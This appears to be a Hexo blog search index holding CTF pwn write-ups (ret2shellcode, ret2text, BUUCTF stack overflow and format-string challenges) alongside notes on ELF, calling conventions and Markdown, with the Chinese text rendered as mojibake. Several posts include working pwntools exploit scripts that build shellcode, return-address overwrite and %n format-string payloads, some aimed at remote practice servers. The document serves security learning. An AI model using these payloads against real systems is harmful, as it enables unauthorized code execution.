<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ä¸€äº›pwn</title>
      <link href="/2023/12/05/some-small-pwn-topics/"/>
      <url>/2023/12/05/some-small-pwn-topics/</url>
      
        <content type="html"><![CDATA[<p>Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·<span id="more"></span></p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>checksecä¸€ä¸‹<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode0.png"><br>32ä½æ–‡ä»¶ï¼Œæœªå¼€å¯canaryä¿æŠ¤ï¼Œæœªå¼€å¯PIE</p><p>ä¸¢åˆ°ida<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode1.png"><br>å®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦å‹æ•°ç»„sï¼Œgetsè¾“å…¥åˆ°sï¼Œå¹¶å°†sçš„0x64ä½å­—èŠ‚æ•°æ®èµ‹ç»™buf2</p><p>åœ¨gdbä¸­å‘ç°getså‡½æ•°çš„æ ˆå¸§é•¿åº¦ä¸º0x92å­—ï¼Œespå­˜å‚¨çš„æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå¯ä»¥çœ‹åˆ°æ•°æ®æ˜¯ä»0xffffd01cå¼€å§‹å¡«å……<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode2.png"><br>é€šè¿‡pythonå¯ä»¥ç®—å‡ºéœ€è¦å¡«å……108 + 4 ä¸ªåƒåœ¾å­—èŠ‚ï¼Œå†åŠ 4ä¸ªå­—èŠ‚çš„æ•°æ®â€”â€”è¿”å›åœ°å€<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode3.png"></p><p>æ‰¾åˆ°å…¨å±€å˜é‡buf2çš„åœ°å€<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode4.png"></p><p>å†™è„šæœ¬  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2 = <span class="number">0x0804a080</span></span><br><span class="line">sh.senline = (shellcode.ljust(<span class="number">112</span>, <span class="string">'A'</span>) + p32(buf2))</span><br><span class="line">sh.interactive()             </span><br></pre></td></tr></tbody></table></figure><p>å¾—åˆ°äº†æœ¬åœ°ç¨‹åºçš„shell<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode5.png">  </p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>checksec<br><img src="/2023/12/05/some-small-pwn-topics/ret2text0.png"><br>32ä½ï¼Œæœªå¼€å¯canaryï¼Œå¼€å¯äº†NX<br>ä¸¢åˆ°idaé‡Œé¢çœ‹ä¸€ä¸‹<br><img src="/2023/12/05/some-small-pwn-topics/ret2text1.png"></p><p>å¯ä»¥çœ‹åˆ°vulnerableå‡½æ•°é‡Œæœ‰getså‡½æ•°ï¼Œè¯»åˆ°çš„å€¼ä¼ åˆ°bufferé‡Œï¼Œè·ç¦»ebp16ä¸ªå­—èŠ‚å†™exp<br>çœ‹åˆ°getshellå‡½æ•°é¦–åœ°å€ä¸º<br><img src="/2023/12/05/some-small-pwn-topics/ret2text2.png"></p><p><img src="/2023/12/05/some-small-pwn-topics/ret2text3.png"></p><p><img src="/2023/12/05/some-small-pwn-topics/ret2text4.png"></p><p>æ‰“é€šã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢ELF</title>
      <link href="/2023/12/01/first-exploration-ELF/"/>
      <url>/2023/12/01/first-exploration-ELF/</url>
      
        <content type="html"><![CDATA[<p>æµ…æµ…åœ°äº†è§£ä¸‹ELFæ–‡ä»¶ï¼Œä»¥åä¼šä»å¤šä¸ªè§’åº¦åå¤é˜è¿°ã€‚<span id="more"></span></p><p><img src="/2023/12/01/first-exploration-ELF/elf.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32ä½ä¼ å‚ VS 64ä½ä¼ å‚</title>
      <link href="/2023/11/20/i386-VS-AMD64/"/>
      <url>/2023/11/20/i386-VS-AMD64/</url>
      
        <content type="html"><![CDATA[<p>å¯¹32ä½ä¼ å‚å’Œ64ä½ä¼ å‚çš„æ¯”è¾ƒ<span id="more"></span></p><blockquote><p>i386=Intel 80386ã€‚å…¶å®i386é€šå¸¸è¢«ç”¨æ¥ä½œä¸ºå¯¹Intelï¼ˆè‹±ç‰¹å°”ï¼‰32ä½å¾®å¤„ç†å™¨çš„ç»Ÿç§°ã€‚<br>AMD64ï¼Œåˆç§°â€œx86-64â€æˆ–â€œx64â€ï¼Œæ˜¯ä¸€ç§64ä½å…ƒçš„ç”µè„‘å¤„ç†å™¨æ¶æ„ã€‚å®ƒæ˜¯å»ºåŸºäºç°æœ‰32ä½å…ƒçš„x86æ¶æ„ï¼Œç”±AMDå…¬å¸æ‰€å¼€å‘ã€‚</p></blockquote><p>2ä½ä½¿ç”¨æ ˆå¸§ï¼ˆæ ˆå¸§æ˜¯æŒ‡å‡½æ•°åœ¨è¢«è°ƒç”¨æ—¶ï¼Œæ‰€æ‹¥æœ‰çš„ä¸€å—ç‹¬ç«‹çš„ç”¨äºå­˜æ”¾å‡½æ•°æ‰€ä½¿ç”¨çš„çŠ¶æ€å’Œå˜é‡çš„æ ˆç©ºé—´ã€‚ æ¯ä¸ªå‡½æ•°éƒ½å¯¹åº”æœ‰ä¸€ä¸ªæ ˆå¸§ã€‚ åŒä¸€ä¸ªå‡½æ•°å¤šæ¬¡è¿›å…¥ï¼Œæ¯æ¬¡å¯èƒ½ä¼šåˆ†é…åˆ°ä¸åŒçš„æ ˆå¸§ã€‚ æ•´ä¸ªæ ˆçš„å†…å®¹åœ¨åŒä¸€ä¸ªæ—¶åˆ»å¯ä»¥çœ‹ä½œæ˜¯ç”±è®¸å¤šæ ˆå¸§ä¾åºâ€œå †å â€ç»„æˆçš„ã€‚ï¼‰æ¥ä½œä¸ºä¼ é€’çš„å‚æ•°çš„ä¿å­˜ä½ç½®ï¼Œè€Œ64ä½ä½¿ç”¨å¯„å­˜å™¨ï¼Œåˆ†åˆ«ç”¨rdi,rsi,rdx,rcx,r8,r9ä½œä¸ºç¬¬1-6ä¸ªå‚æ•°ï¼Œå½“å‚æ•°ä¸º7ä¸ªä»¥ä¸Šæ—¶ï¼Œ å‰ 6 ä¸ªä¸å‰é¢ä¸€æ ·ï¼Œ ä½†åé¢çš„ä¾æ¬¡ä» â€œå³å‘å·¦â€ æ”¾å…¥æ ˆä¸­ï¼Œå³å’Œ32ä½æ±‡ç¼–ä¸€æ ·ã€‚raxä½œä¸ºè¿”å›å€¼ 64ä½æ²¡æœ‰æ ˆå¸§çš„æŒ‡é’ˆï¼Œ32ä½ç”¨ebpä½œä¸ºæ ˆå¸§æŒ‡é’ˆï¼Œ64ä½å–æ¶ˆäº†è¿™ä¸ªè®¾å®šï¼Œrbpä½œä¸ºé€šç”¨å¯„å­˜å™¨ä½¿ç”¨ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf_pwn_wp</title>
      <link href="/2023/11/18/buuctf-pwn-wp/"/>
      <url>/2023/11/18/buuctf-pwn-wp/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸€äº›pwné¢˜wp<span id="more"></span></p><h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><p>æµ‹è¯•ncï¼Œ ls çœ‹åˆ°æœ‰flagï¼Œ cat flagå¾—åˆ°flagã€‚<br><img src="/2023/11/18/buuctf-pwn-wp/test_your_nc.png">  </p><blockquote><p>ncæ˜¯<a href="https://so.csdn.net/so/search?q=netcat&amp;spm=1001.2101.3001.7020">netcat</a>çš„ç®€å†™</p><p>ï¼ˆ1ï¼‰å®ç°ä»»æ„TCP/UDPç«¯å£çš„ä¾¦å¬ï¼Œncå¯ä»¥ä½œä¸ºserverä»¥TCPæˆ–UDPæ–¹å¼ä¾¦å¬æŒ‡å®šç«¯å£<br>ï¼ˆ2ï¼‰ç«¯å£çš„æ‰«æï¼Œncå¯ä»¥ä½œä¸ºclientå‘èµ·TCPæˆ–UDPè¿æ¥<br>ï¼ˆ3ï¼‰æœºå™¨ä¹‹é—´ä¼ è¾“æ–‡ä»¶<br>ï¼ˆ4ï¼‰æœºå™¨ä¹‹é—´ç½‘ç»œæµ‹é€Ÿ</p></blockquote><p><code>nc [-hlnruz][-g&lt;ç½‘å…³...&gt;][-G&lt;æŒ‡å‘å™¨æ•°ç›®&gt;][-i&lt;å»¶è¿Ÿç§’æ•°&gt;][-o&lt;è¾“å‡ºæ–‡ä»¶&gt;][-p&lt;é€šä¿¡ç«¯å£&gt;][-s&lt;æ¥æºä½å€&gt;][-v...][-w&lt;è¶…æ—¶ç§’æ•°&gt;][ä¸»æœºåç§°][é€šä¿¡ç«¯å£...]</code></p><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>æ‹–åˆ°idaé‡Œé¢çœ‹ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªå±é™©å‡½æ•°get ï¼Œå®ƒä»ä¸æ£€æŸ¥è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè€Œæ˜¯ä»¥å›è½¦æ¥åˆ¤æ–­è¾“å…¥æ˜¯å¦ç»“æŸï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“å¯ä»¥å¯¼è‡´æ ˆæº¢å‡ºã€‚é¡ºä¾¿ä¹ŸçŸ¥é“äº†15ä¸ªå­—èŠ‚çš„å­˜å‚¨ç©ºé—´ï¼Œé‚£ä¹ˆåœ¨æ ˆå¸§ä¸­ç³»ç»Ÿå°±ä¼šç»™æˆ‘ä»¬åˆ†é…ä¸€ä¸ª15ä¸ªå­—èŠ‚çš„å­˜å‚¨ç©ºé—´<br><img src="/2023/11/18/buuctf-pwn-wp/rip.png"><br>funå‡½æ•°é‡Œé¢å‘ç°äº†systemå‡½æ•°ï¼Œsystemæ˜¯cè¯­è¨€ä¸‹çš„ä¸€ä¸ªå¯ä»¥æ‰§è¡Œshellå‘½ä»¤çš„å‡½æ•°ï¼Œç›®å‰å¯ä»¥ç®€å•ç†è§£ä¸ºï¼Œæ‰§è¡Œäº†è¿™ä¸ªå±é™©å‡½æ•°ï¼Œæˆ‘ä»¬å°±æ‹¿åˆ°äº†è¿œç«¯æœåŠ¡å™¨çš„shellï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºåœ¨windowsä¸‹ä»¥ç®¡ç†å‘˜èº«ä»½å¼€å¯cmdï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸€ç³»åˆ—åç»­æŒ‡ä»¤æ§åˆ¶è¿œç«¯æœåŠ¡å™¨ã€‚<br><img src="/2023/11/18/buuctf-pwn-wp/rip1.png"><br>ç¼–å†™è„šæœ¬<br><img src="/2023/11/18/buuctf-pwn-wp/rip2.png"><br>ls çœ‹åˆ°flagçš„æ–‡ä»¶ï¼Œcat flag<br><img src="/2023/11/18/buuctf-pwn-wp/rip3.png"></p><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p><img src="/2023/11/18/buuctf-pwn-wp/warmup_csaw_2016%201.png"><br>64ä½æ–‡ä»¶ï¼Œè€Œä¸”æ²¡æœ‰å¼€å¯ä¿æŠ¤<br>æ‹–è¿›ida<br><img src="/2023/11/18/buuctf-pwn-wp/warm2.png"><br> <img src="/2023/11/18/buuctf-pwn-wp/warm4.png"><br>å‘ç°å±é™©å‡½æ•°_getsï¼Œè¿˜çœ‹åˆ°äº†systemå‡½æ•°<br>ç¼–å†™payloadè„šæœ¬<br><img src="/2023/11/18/buuctf-pwn-wp/warmup4.png"><br><img src="/2023/11/18/buuctf-pwn-wp/warm3.png"></p><hr><h1 id="ç¬¬äºŒå‘¨"><a href="#ç¬¬äºŒå‘¨" class="headerlink" title="ç¬¬äºŒå‘¨"></a>ç¬¬äºŒå‘¨</h1><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p><img src="/2023/11/18/buuctf-pwn-wp/2019.png"><br>å‘ç°å¼€å¯äº†NXï¼Œæ— æ³•ç”¨shellcode<br>ä¸¢åˆ°ida  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);<span class="comment">// è®¾ç½®æ ‡å‡†è¾“å‡º _bss_start çš„ç¼“å†²æ–¹å¼</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>); <span class="comment">// è®¾ç½®æ ‡å‡†è¾“å…¥ stdin çš„ç¼“å†²æ–¹å¼</span></span><br><span class="line">  func(); <span class="comment">// è°ƒç”¨ func å‡½æ•°</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>å†çœ‹funcå‡½æ•°  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">  <span class="comment">//é¦–å…ˆå£°æ˜äº†ä¸€ä¸ªé•¿åº¦ä¸º 44 çš„å­—ç¬¦æ•°ç»„ v1 å’Œä¸€ä¸ªæµ®ç‚¹æ•° v2</span></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's guess the number."</span>); <span class="comment">//è¾“å‡ºæç¤ºä¿¡æ¯ "Let's guess the number."</span></span><br><span class="line">  gets(v1); <span class="comment">//ä½¿ç”¨ gets å‡½æ•°ï¼ˆå±é™©å‡½æ•°ï¼‰æ¥æ”¶è¾“å…¥ï¼Œå­˜å‚¨åœ¨ v1 ä¸­</span></span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">"cat /flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Its value should be 11.28125"</span>);</span><br><span class="line">    <span class="comment">//æœ€åï¼Œé€šè¿‡æ¯”è¾ƒ v2 æ˜¯å¦ç­‰äº 11.28125ï¼Œå¦‚æœç›¸ç­‰ï¼Œåˆ™æ‰§è¡Œ "cat /flag"ï¼Œå¦åˆ™è¾“å‡º "Its value should be 11.28125"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>æ‰¾åˆ°systemå‡½æ•°çš„åœ°å€<br><img src="/2023/11/18/buuctf-pwn-wp/20191.png"><br>å†™payload  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªä¸è¿œç¨‹ä¸»æœºé€šä¿¡çš„è¿æ¥</span></span><br><span class="line">p = remote(<span class="string">"node4.buuoj.cn"</span>, <span class="number">28403</span>) </span><br><span class="line"><span class="comment"># æ„é€  payloadï¼Œå…¶ä¸­åŒ…å« 'a'*(0x30+8) çš„å¡«å……å’Œ 0x4006BE çš„åœ°å€</span></span><br><span class="line">payload = <span class="string">b'a'</span> * (<span class="number">0x30</span> + <span class="number">8</span>) + p64(<span class="number">0x4006BE</span>)</span><br><span class="line"><span class="comment"># å‘é€ payload åˆ°è¿œç¨‹ä¸»æœº</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># ä¸è¿œç¨‹ä¸»æœºè¿›è¡Œäº¤äº’ï¼Œå¯ä»¥æ‰‹åŠ¨è¾“å…¥æˆ–è€…ä½¿ç”¨è„šæœ¬è¿›è¡Œè¿›ä¸€æ­¥çš„æ“ä½œ</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/11/18/buuctf-pwn-wp/20192.png">  </p><h1 id="ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5"><a href="#ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5" class="headerlink" title="[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5"></a>[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5</h1><p><img src="/2023/11/18/buuctf-pwn-wp/pwn5.png"><br>32ä½æ–‡ä»¶ï¼Œå¼€å¯äº†æ ˆæº¢å‡ºä¿æŠ¤ï¼Œå¼€å¯äº†NX<br>ä¸¢åˆ°idaé‡Œ  </p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF //å®šä¹‰ä¸€ä¸ªé•¿åº¦ä¸º100çš„å­—ç¬¦æ•°ç»„</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">srand</span>(v1);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">read</span>(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"your name:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x63</span>u); <span class="comment">//ç­‰å¾…ç”¨æˆ·åœ¨ç»ˆç«¯æ”¶å…¥ï¼Œå­˜å…¥bufä¸­ï¼Œæœ€å¤šè¯»å–0x63uï¼ˆ99ï¼‰ä¸ªå­—èŠ‚</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello,"</span>); <span class="comment">// å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span></span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"your passwd:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">atoi</span>(nptr) == dword_804C044 ) <span class="comment">// åªè¦æ»¡è¶³è¿™ä¸ªæ¡ä»¶å°±å¯ä»¥å¾—åˆ°flag</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"ok!!"</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"fail"</span>);</span><br><span class="line">  }</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    <span class="built_in">sub_80493D0</span>();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>è®¡ç®—åç§»é‡ä½10<br><img src="/2023/11/18/buuctf-pwn-wp/pwn51.png"><br>å†™ä¸‹è„šæœ¬  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node4.buuoj.cn'</span>,<span class="number">29083</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804C044</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"AAAA%16$n%17$n%18$n%19$n"</span> + p32(bss) + p32(bss+<span class="number">1</span>) + p32(bss+<span class="number">2</span>) + p32(bss+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x04040404</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>cat falg<br><img src="/2023/11/18/buuctf-pwn-wp/pwn53.png"></p><h1 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h1><p>checksec,32ä½æ–‡ä»¶ï¼Œ<br><img src="/2023/11/18/buuctf-pwn-wp/shellcode_asm0.png">    </p><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>checksecæŸ¥çœ‹ä¸‹ä¿æŠ¤ 64 ä½æ–‡ä»¶ï¼Œå¼€å¯äº†NXæ— æ³•ä½¿ç”¨shellcode<br><img src="/2023/11/18/buuctf-pwn-wp/2019c.png"><br>ä¸¢åˆ°idaé‡ŒæŸ¥çœ‹<br>å‘ç°encryptå‡½æ•°é‡Œæœ‰getså‡½æ•°ï¼Œå¤§æ¦‚æ˜¯æ ˆæº¢å‡º<br><img src="/2023/11/18/buuctf-pwn-wp/2019c1.png">  </p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD å­¦ä¹ è®°å½•</title>
      <link href="/2023/11/12/my-first-blog-about-MD/"/>
      <url>/2023/11/12/my-first-blog-about-MD/</url>
      
        <content type="html"><![CDATA[<p>ä¸ºäº†ç£ä¿ƒæˆ‘çš„å­¦ä¹ å†™ä¸€ç¯‡è®°å½•æˆ‘çš„å­¦ä¹ è¿›ç¨‹<span id="more"></span></p><h3 id="æ ‡é¢˜"><a href="#æ ‡é¢˜" class="headerlink" title="æ ‡é¢˜"></a>æ ‡é¢˜</h3><p><code># ä¸€çº§æ ‡é¢˜</code></p><p><code>## äºŒçº§æ ‡é¢˜</code></p><p><code>### ä¸‰çº§æ ‡é¢˜</code></p><p><code>#### å››çº§æ ‡é¢˜</code></p><p><code>##### äº”çº§æ ‡é¢˜</code></p><p><code>###### å…­çº§æ ‡é¢˜</code></p><h3 id="å­—ä½“æ ·å¼"><a href="#å­—ä½“æ ·å¼" class="headerlink" title="å­—ä½“æ ·å¼"></a>å­—ä½“æ ·å¼</h3><p><em>è¿™æ˜¯æ–œä½“</em>   <code>*è¿™æ˜¯æ–œä½“*</code></p><p><strong>è¿™æ˜¯ç²—ä½“</strong>  <code>**è¿™æ˜¯ç²—ä½“**</code></p><p><em><strong>è¿™æ˜¯ç²—æ–œä½“</strong></em>  <code>***è¿™æ˜¯ç²—æ–œä½“***</code></p><p><del>è¿™æ˜¯åˆ é™¤çº¿</del>  <code>~~è¿™æ˜¯åˆ é™¤çº¿~~</code></p><h3 id="æ¢è¡Œ"><a href="#æ¢è¡Œ" class="headerlink" title="æ¢è¡Œ"></a>æ¢è¡Œ</h3><p>è¿™æ˜¯æ–‡æœ¬ä¸€<br>è¿™æ˜¯æ–‡æœ¬äºŒ</p><p>è¿™æ˜¯æ–‡æœ¬ä¸€</p><p>è¿™æ˜¯æ–‡æœ¬äºŒ</p><p><code>è¿™æ˜¯æ–‡æœ¬ä¸€  è¿™æ˜¯æ–‡æœ¬äºŒ //æ®µè½å†…æ¢è¡Œä½¿ç”¨æ¢è¡Œç¬¦ &lt;br&gt;ï¼Œæˆ–è€… ä¸¤ä¸ªç©ºæ ¼ + shift-Enterã€‚</code></p><h3 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h3><ol><li><p>ç¬¬ä¸€</p></li><li><p>ç¬¬äºŒ</p></li><li><p>ç¬¬ä¸‰</p></li><li><p>ç¬¬ä¸€</p></li><li><p>ç¬¬äºŒ</p></li><li><p>ç¬¬äºŒ</p></li><li><p>ç¬¬äºŒ</p></li><li><p>ç¬¬å…­</p></li><li><p><input checked="" disabled="" type="checkbox"> å·²é€‰ä¸­çš„é€‰é¡¹</p></li><li><p><input disabled="" type="checkbox"> æœªé€‰ä¸­çš„é€‰é¡¹</p></li></ol><ul><li>ç¬¬ä¸€</li><li>ç¬¬äºŒ</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. ç¬¬ä¸€</span><br><span class="line"></span><br><span class="line">2. ç¬¬äºŒ</span><br><span class="line"></span><br><span class="line">3. ç¬¬ä¸‰</span><br><span class="line"></span><br><span class="line">4. ç¬¬ä¸€</span><br><span class="line">5. ç¬¬äºŒ</span><br><span class="line">6. ç¬¬äºŒ</span><br><span class="line">7. ç¬¬äºŒ</span><br><span class="line">8. ç¬¬å…­</span><br><span class="line"></span><br><span class="line">9. [x] å·²é€‰ä¸­çš„é€‰é¡¹</span><br><span class="line">10. [ ] æœªé€‰ä¸­çš„é€‰é¡¹</span><br><span class="line"></span><br><span class="line">- ç¬¬ä¸€</span><br><span class="line">- ç¬¬äºŒ</span><br></pre></td></tr></tbody></table></figure><blockquote><p>å½“æŒ‰ä¸¤æ¬¡ç©ºæ ¼å‘ç°æ²¡æœ‰é€€å‡ºåˆ—è¡¨ï¼Œå¯ä»¥æŒ‰ctrl + [ 